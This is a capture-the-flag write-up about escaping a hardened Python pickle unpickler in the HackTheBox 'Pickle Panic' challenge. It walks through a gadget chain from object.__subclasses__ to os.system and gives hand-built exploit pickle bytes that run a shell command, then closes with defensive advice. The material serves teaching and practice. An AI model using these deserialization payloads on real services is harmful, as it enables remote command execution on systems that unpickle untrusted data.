---
layout: post
title: "Pickle Panic"
date: 2028-03-17 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, pickle, deserialization, sandbox-escape, python, jail]
description: "A hardened pickle unpickler blacklists dangerous opcodes and restricts find_class to a bare 'empty' module — but it keeps GLOBAL and REDUCE, and dict.setdefault becomes a write primitive that walks the class tree all the way to os.system."
---

## Overview

Pickle Panic is a Medium Misc challenge: a service that unpickles the hex you send through a **custom hardened `Unpickler`**. It falls to an [insecure deserialization](https://cwe.mitre.org/data/definitions/502.html) escape — the opcode blacklist and module allow-list both leave enough surface to reach `os.system`.

## The jail

`challenge.py` runs your pickle under three defenses:

1. **Opcode blacklist** (checked via `pickletools.genops`): `BUILD`, `SETITEM(S)`, `DICT`, `EMPTY_DICT`, `INST`, `OBJ`, `NEWOBJ(_EX)`, `EXT*`, `FRAME`, etc. — but **`GLOBAL` and `REDUCE` survive**, which is all pickle RCE needs.
2. **`find_class` allow-list**: a symbol loads only if `module == "empty"` **and** `name.count(".") <= 1` **and** `"setattr"`/`"setitem"` not in the name. `empty` is a freshly created bare module with nothing useful in it.
3. **≤ 400 bytes.**

## The two gadgets

- **`empty.__class__.__base__`** = `object` (name `"__class__.__base__"` — exactly one dot, allowed). From `object`, `object.__subclasses__()` lists every class in the process, including `os._wrap_close`, whose `__init__.__globals__` holds `system`.
- **`empty.__dict__.setdefault`** (one dot; `"setdefault"` contains neither `"setattr"` nor `"setitem"`). `dict.setdefault(key, value)` **writes `key → value` into the empty module's namespace** — the banned `setattr`/`setitem` in disguise.

The "one dot" rule caps attribute depth at two hops, but `setdefault` lets you stash each intermediate object back into `empty` and keep going — so an arbitrarily deep chain is walked two hops at a time.

## The chain

Each step is a `REDUCE` call whose result is saved under a new short name:

```
empty.a = object                        # setdefault('a', empty.__class__.__base__)
empty.b = empty.a.__subclasses__()      # every class
empty.c = empty.b.__getitem__(138)      # os._wrap_close  (index is build-specific)
empty.d = empty.c.__init__
empty.e = empty.d.__globals__           # os module globals
          empty.e.__getitem__('system')('cat flag.txt')
```

Every `GLOBAL` uses `empty <name>` with at most one dot, and the pickle needs the `\x80\x04` (PROTO 4) prefix so `find_class` performs dotted-name traversal. The whole thing is ~397 bytes — just under the limit.

## Robustness — recon the index live

The `__subclasses__()` index of `os._wrap_close` shifts between CPython builds (137 in one, 138 in another). Rather than hardcode it, the solver first sends a **recon pickle** returning `object.__subclasses__()`, parses the printed list, and finds the right index on the *live* target — then builds the exploit with it:

```python
RECON = (b"\x80\x04cempty\n__dict__.setdefault\n(S'a'\n"
         b"cempty\n__class__.__base__\ntR0cempty\na.__subclasses__\n)R.")

def exploit_pickle(index, cmd):
    idx, c = str(index).encode(), cmd.encode()
    return (b"\x80\x04cempty\n__dict__.setdefault\n(S'a'\ncempty\n__class__.__base__\ntR0"
            b"cempty\na.__subclasses__\n)Rp0\n0"
            b"cempty\n__dict__.setdefault\n(S'b'\ng0\ntR0"
            b"cempty\nb.__getitem__\n(I" + idx + b"\ntRp1\n0"
            b"cempty\n__dict__.setdefault\n(S'c'\ng1\ntR0"
            b"cempty\n__dict__.setdefault\n(S'd'\ncempty\nc.__init__\ntR0"
            b"cempty\n__dict__.setdefault\n(S'e'\ncempty\nd.__globals__\ntR0"
            b"cempty\ne.__getitem__\n(S'system'\ntR(S'" + c + b"'\ntR.")
```

Send `RECON.hex()`, locate `os._wrap_close`, then send `exploit_pickle(idx, "cat flag.txt").hex()`. The service prints the flag. (Note: write the pickle by hand — `pickle.dumps` adds the blacklisted `FRAME` opcode.)

## Why it worked

- An opcode blacklist that keeps `GLOBAL`+`REDUCE` isn't a sandbox.
- Restricting `find_class` to a "safe empty" module is meaningless once `empty.__class__.__base__` reaches `object` and its full subclass graph.
- `dict.setdefault` is a write primitive the `"setattr"`/`"setitem"` substring filter never anticipated — filtering method *names* misses semantic equivalents.

## Fix / defense

- Never unpickle untrusted data. Use a data-only format (JSON) or a signed/authenticated serializer.
- If pickle is unavoidable, allow-list **exact fully-qualified symbols** (a tiny set of known-safe classes), and forbid `REDUCE`/`GLOBAL` for untrusted input.
- Filter by capability/identity, not by substring — `setdefault`, `__reduce__`, and `__class__` traversal all reach `object` and builtins.
